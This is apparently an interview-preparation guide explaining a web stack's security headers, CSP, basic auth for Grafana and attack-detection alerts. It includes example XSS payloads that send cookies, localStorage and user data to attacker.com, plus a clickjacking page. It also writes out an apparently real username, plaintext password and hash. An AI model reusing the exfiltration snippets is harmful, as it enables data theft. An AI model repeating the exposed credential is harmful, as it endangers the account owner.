# Interview Guide: Security Implementation

##  Selling Point
"I implemented defense-in-depth security with strict CSP, HSTS, and edge authentication, while balancing usability by allowing specific CDNs for necessary functionality."

##  Security Headers Deep Dive

### HSTS (Strict-Transport-Security)

```nginx
Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
```

**What It Does**:
- Browser remembers "this site is HTTPS-only" for 1 year (31536000 seconds)
- Applies to all subdomains
- Eligible for browser HSTS preload list

**Attack It Prevents**:
```
User types: http://yoursite.com
Without HSTS:
  → HTTP request sent (attacker can intercept)
  → Server redirects to HTTPS
  → First connection vulnerable to MITM

With HSTS:
  → Browser sees "yoursite.com in HSTS list"
  → Automatically upgrades to HTTPS BEFORE request
  → No HTTP connection ever made
```

**Interview Story**: "HSTS protects the critical first connection. Even if a user types HTTP or clicks an old link, their browser automatically upgrades to HTTPS, preventing SSL stripping attacks."

---

### X-Content-Type-Options: nosniff

```nginx
X-Content-Type-Options "nosniff"
```

**Attack Scenario**:
1. Attacker uploads file `evil.txt` containing JavaScript
2. Server responds: `Content-Type: text/plain`
3. Without nosniff: Browser "sniffs" content, sees JS syntax, **executes it** (XSS!)
4. With nosniff: Browser respects header, treats as plain text, **doesn't execute**

**Real Example**:
```html
<!-- Uploaded as "profile.txt" but contains: -->
<script>
  fetch('/api/user/data').then(r => r.json()).then(data => 
    fetch('https://attacker.com/steal?data=' + JSON.stringify(data))
  )
</script>
```

**Interview Point**: "MIME sniffing was a browser feature that caused security issues. nosniff forces browsers to trust our Content-Type header, preventing execution of disguised malicious files."

---

### X-Frame-Options: SAMEORIGIN

```nginx
X-Frame-Options "SAMEORIGIN"
```

**Clickjacking Attack**:
```html
<!-- attacker.com -->
<style>
  iframe { opacity: 0; position: absolute; top: 0; }
  button { position: absolute; top: 100px; }
</style>

<iframe src="https://yourbank.com/transfer"></iframe>
<button>Click to Win $1000!</button>

<!-- User clicks button, actually clicks "Transfer Money" in invisible iframe -->
```

**SAMEORIGIN Protection**:
-  `yoursite.com/page1` can iframe `yoursite.com/page2`
-  `attacker.com` cannot iframe `yoursite.com`

**Why We Allow Same-Origin**: Some dashboards (Grafana) embed panels in other pages of the same site.

---

##  Content Security Policy (CSP)

### Our Policy Breakdown

```nginx
Content-Security-Policy "
  default-src 'self'; 
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; 
  style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://fonts.googleapis.com https://cdn.jsdelivr.net; 
  img-src 'self' data: https:; 
  font-src 'self' data: https://cdnjs.cloudflare.com https://fonts.gstatic.com; 
  connect-src 'self'
"
```

### Directive-by-Directive Analysis

#### default-src 'self'
**Meaning**: "By default, only load resources from our own origin"

**Blocks**:
-  `<script src="https://evil.com/malware.js">`
-  `<img src="https://tracker.com/pixel.gif">`

**Allows**:
-  `<script src="/assets/app.js">`
-  `<link href="/style.css">`

---

#### script-src (The Most Critical)

```nginx
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net
```

**Breaking It Down**:

| Directive | Allows | Risk | Why We Use It |
|-----------|--------|------|---------------|
| `'self'` | `/assets/app.js` | None | Our own scripts safe |
| `'unsafe-inline'` | `<script>alert(1)</script>` | **High XSS risk** | FastAPI Swagger UI needs inline scripts |
| `'unsafe-eval'` | `eval("code")`, `new Function()` | **Medium risk** | Some libraries use eval |
| `https://cdn.jsdelivr.net` | jsDelivr CDN | Low (trusted CDN) | Swagger UI loads CSS/JS from CDN |

**The Trade-off**:

**Strict CSP** (no unsafe-inline):
```nginx
script-src 'self' 'nonce-abc123' https://cdn.jsdelivr.net
```
Then in HTML:
```html
<script nonce="abc123">alert('Only this runs')</script>
<script>alert('Blocked!')</script>  <!-- Injected XSS blocked -->
```

**Why We Don't Use It (Yet)**:
- Requires rewriting all inline scripts with nonces
- FastAPI/Swagger generates inline scripts we can't control
- Framework limitation, not lack of knowledge

**Interview Answer**: "I accept 'unsafe-inline' as a temporary trade-off because our framework requires it. In production, I'd migrate to CSP nonces by externalizing scripts and adding a middleware to inject random nonces per request."

---

#### style-src (The Swagger Fix)

```nginx
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net
```

**Real Bug We Fixed**:

**Before**:
```nginx
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
```

**Result**: Swagger UI loaded but was completely unstyled (white page, plain HTML)

**Browser Console**:
```
Refused to load stylesheet 'https://cdn.jsdelivr.net/npm/swagger-ui-dist/swagger-ui.css' 
because it violates Content-Security-Policy directive "style-src ..."
```

**Fix**: Added `https://cdn.jsdelivr.net` to whitelist

**Interview Story**: "I debugged by opening browser DevTools, saw CSP violation errors, identified the blocked CDN, added it to the whitelist, and verified Swagger UI styled correctly. This demonstrates practical CSP troubleshooting."

---

#### connect-src (API Protection)

```nginx
connect-src 'self'
```

**What It Controls**:
- `fetch()` requests
- `XMLHttpRequest`
- WebSockets
- EventSource

**Attack It Prevents**:
```javascript
// XSS injected malicious script tries to exfiltrate data
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: localStorage
  })
});
```

**With connect-src 'self'**: Request **blocked**, data not exfiltrated

**Interview Point**: "Even if XSS bypasses other protections, connect-src limits damage by preventing malicious scripts from sending data to attacker-controlled servers."

---

##  Basic Authentication Layer

### Implementation

```nginx
handle /grafana* {
    basic_auth {
        pretamane $2a$14$VBOmQYX9BQOaEPTCUXEIGekFJp9xfzMo8cs7ocDgMcjTYr68mIuNO
    }
    reverse_proxy grafana:3000
}
```

### How Basic Auth Works

```
1. Browser: GET /grafana
2. Caddy: 401 Unauthorized + WWW-Authenticate: Basic realm="..."
3. Browser: Shows login prompt
4. User: Enters pretamane / #ThawZin2k77!
5. Browser: GET /grafana
   Authorization: Basic cHJldGFtYW5lOiNUaGF3WmluMms3NyE=
                         ↑ base64("pretamane:#ThawZin2k77!")
6. Caddy: Decodes, hashes password with bcrypt, compares to $2a$14$VBO...
7. If match: Forward to Grafana
   If no match: 401 Unauthorized
```

### Password Hash Generation

```bash
docker run --rm caddy:2-alpine caddy hash-password --plaintext '#ThawZin2k77!'
# Output: $2a$14$VBOmQYX9BQOaEPTCUXEIGekFJp9xfzMo8cs7ocDgMcjTYr68mIuNO
```

**bcrypt Properties**:
- **Salted**: Same password hashes differently each time
- **Slow**: Takes ~100ms to hash (prevents brute force)
- **Adaptive**: Can increase cost factor as CPUs get faster

**Interview Insight**: "Basic Auth is simple but we use bcrypt hashing which is resistant to brute force. For production, I'd migrate to OAuth2/OIDC for better security and UX."

---

##  Security Monitoring with Alerts

### Attack Detection Alerts

```yaml
# High 4xx rate (scanning/probing)
- alert: High4xxErrorRate
  expr: sum(rate(http_requests_total{status=~"4.."}[5m])) > 10
  for: 3m
  labels:
    severity: warning
    category: security
  annotations:
    summary: "Possible scanning detected"
    description: "{{ $value }} 4xx errors/sec"
```

**What It Detects**:
- Attackers scanning for endpoints: `/admin`, `/wp-admin`, `/.env`, `/config.php`
- Each scan generates 404s
- Normal traffic: 0.1-1 404/sec
- Attack: 10-100+ 404/sec

**Response**:
1. Alert fires → Security team notified
2. Check source IPs in logs:
   ```logql
   {job="caddy",status="404"} | json | line_format "{{.remote_ip}}"
   ```
3. If single IP: Block at firewall
4. If distributed: Enable rate limiting

---

### Request Rate Spike (DDoS Detection)

```yaml
- alert: RequestRateSpike
  expr: rate(http_requests_total[1m]) > 100
  for: 2m
  labels:
    severity: warning
  annotations:
    summary: "Abnormal traffic spike"
```

**Normal Traffic**: 5-20 req/sec  
**Alert Threshold**: >100 req/sec  
**Indicates**: DDoS attempt or viral traffic

**Mitigation**:
1. Check if legitimate (viral post, marketing campaign)
2. If attack: Enable Cloudflare DDoS protection
3. If legitimate: Scale up infrastructure

---

##  Production Security Roadmap

### Current State → Production Improvements

| Current | Risk Level | Production Fix |
|---------|-----------|----------------|
| Basic Auth | Medium | Migrate to OAuth2/OIDC (Keycloak/Authelia) |
| 'unsafe-inline' CSP | Medium | Implement nonce-based CSP |
| No rate limiting | Medium | Add Caddy rate limiter (10 req/sec per IP) |
| Passwords in .env | Low | Use Docker secrets or Vault |
| HTTP only | High | Enable HTTPS with Let's Encrypt |
| Single Caddy instance | Medium | Run 2+ instances behind load balancer |

### OAuth2 Migration Path

**Current** (Basic Auth):
```
User → Login Prompt → bcrypt check → Access granted
```

**Future** (OAuth2 with Keycloak):
```
User → Redirected to Keycloak
     → Login with SSO (Google/Azure AD)
     → Keycloak issues JWT token
     → Token validated at edge
     → Access granted
```

**Benefits**:
-  Single Sign-On (one login for all tools)
-  MFA support
-  Centralized user management
-  Token expiration/refresh
-  Audit trail of logins

---

##  Interview Talking Points

1. **"Defense in depth"**: Multiple security layers (CSP, HSTS, XFO, nosniff, auth) - if one fails, others protect.

2. **"CSP trade-offs"**: Accept 'unsafe-inline' temporarily due to framework constraints, but know how to fix it (nonces/hashes).

3. **"Real-world debugging"**: Fixed Swagger UI styling by reading CSP violation errors in browser console, adding CDN to whitelist.

4. **"Security monitoring"**: Don't just implement controls, monitor for attacks (4xx spikes, request rate anomalies).

5. **"Production roadmap"**: Current setup is functional but I can articulate improvements (OAuth2, nonce-CSP, rate limiting, HTTPS).

6. **"Balanced approach"**: Security shouldn't break functionality - I whitelist specific trusted CDNs rather than allowing all origins.
